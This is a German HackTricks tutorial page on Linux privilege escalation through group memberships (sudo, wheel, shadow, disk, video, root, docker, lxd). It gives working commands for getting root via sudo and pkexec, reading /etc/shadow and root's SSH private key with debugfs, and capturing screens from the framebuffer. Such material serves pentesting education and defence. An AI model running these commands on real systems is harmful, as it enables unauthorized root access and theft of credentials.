<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


# Sudo/Admin-Gruppen

## **PE - Methode 1**

**Manchmal** finden Sie **standardmäßig \(oder weil einige Software dies benötigt\)** in der Datei **/etc/sudoers** einige dieser Zeilen:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dies bedeutet, dass **jeder Benutzer, der zur Gruppe sudo oder admin gehört, alles als sudo ausführen kann**.

Wenn dies der Fall ist, können Sie **einfach root werden, indem Sie Folgendes ausführen**:
```text
sudo su
```
## PE - Methode 2

Finde alle suid-Binärdateien und überprüfe, ob die Binärdatei **Pkexec** vorhanden ist:
```bash
find / -perm -4000 2>/dev/null
```
Wenn Sie feststellen, dass die Binärdatei pkexec eine SUID-Binärdatei ist und Sie zur Gruppe sudo oder admin gehören, können Sie wahrscheinlich Binärdateien als sudo mit pkexec ausführen.
Überprüfen Sie den Inhalt von:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Dort finden Sie, welche Gruppen berechtigt sind, **pkexec** und **standardmäßig** in einigen Linux-Distributionen können einige der Gruppen **sudo oder admin** sein.

Um **Root zu werden, können Sie ausführen**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Wenn Sie versuchen, **pkexec** auszuführen und Sie diesen **Fehler** erhalten:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Es liegt nicht daran, dass Sie keine Berechtigungen haben, sondern dass Sie ohne eine grafische Benutzeroberfläche nicht verbunden sind**. Und es gibt hier eine Lösung für dieses Problem: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Sie benötigen **2 verschiedene SSH-Sitzungen**:

{% code title="Sitzung1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="Sitzung2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel-Gruppe

Manchmal finden Sie standardmäßig in der Datei **/etc/sudoers** diese Zeile:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Dies bedeutet, dass **jeder Benutzer, der zur Gruppe wheel gehört, alles als sudo ausführen kann**.

Wenn dies der Fall ist, können Sie **einfach root werden, indem Sie Folgendes ausführen**:
```text
sudo su
```
# Shadow-Gruppe

Benutzer der **Gruppe shadow** können die Datei **/etc/shadow** **lesen**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lesen Sie die Datei und versuchen Sie, einige Hashes zu **knacken**.

# Disk-Gruppe

Dieses Privileg ist fast **gleichwertig mit Root-Zugriff**, da Sie auf alle Daten innerhalb der Maschine zugreifen können.

Dateien: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Beachten Sie, dass Sie mit debugfs auch **Dateien schreiben** können. Zum Beispiel können Sie `/tmp/asd1.txt` nach `/tmp/asd2.txt` kopieren, indem Sie Folgendes tun:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Jedoch erhältst du eine "**Zugriffsverweigerung**"-Fehlermeldung, wenn du versuchst, Dateien im Besitz von root zu **schreiben** \(wie `/etc/shadow` oder `/etc/passwd`\).

# Video-Gruppe

Mit dem Befehl `w` kannst du herausfinden, **wer im System angemeldet ist**, und es wird eine Ausgabe wie die folgende angezeigt:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** bedeutet, dass der Benutzer **yossi physisch an einem Terminal auf dem Gerät angemeldet** ist.

Die **video-Gruppe** hat Zugriff auf die Bildschirmausgabe. Im Grunde kannst du die Bildschirme beobachten. Um das zu tun, musst du das aktuelle Bild auf dem Bildschirm als Rohdaten erfassen und die Auflösung des Bildschirms erhalten. Die Bildschirmdaten können in `/dev/fb0` gespeichert werden und du kannst die Auflösung dieses Bildschirms in `/sys/class/graphics/fb0/virtual_size` finden.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Um das **Rohbild** zu **öffnen**, können Sie **GIMP** verwenden, wählen Sie die Datei **`screen.raw`** aus und wählen Sie als Dateityp **Rohbilddaten**:

![](../../.gitbook/assets/image%20%28208%29.png)

Ändern Sie dann die Breite und Höhe auf diejenigen, die auf dem Bildschirm verwendet werden, und überprüfen Sie verschiedene Bildtypen \(und wählen Sie denjenigen aus, der den Bildschirm am besten darstellt\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root-Gruppe

Es scheint, dass standardmäßig **Mitglieder der Root-Gruppe** Zugriff auf die **Änderung** einiger **Service-Konfigurationsdateien** oder einiger **Bibliotheksdateien** oder **anderer interessanter Dinge** haben könnten, die zur Eskalation von Berechtigungen verwendet werden könnten...

**Überprüfen Sie, welche Dateien von Root-Mitgliedern geändert werden können**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker-Gruppe

Sie können das Wurzeldateisystem der Host-Maschine an das Volume einer Instanz anhängen, sodass beim Start der Instanz sofort ein `chroot` in diesem Volume geladen wird. Dadurch erhalten Sie effektiv Root-Zugriff auf die Maschine.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd-Gruppe

[lxc - Privilege Escalation](lxd-privilege-escalation.md)



<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
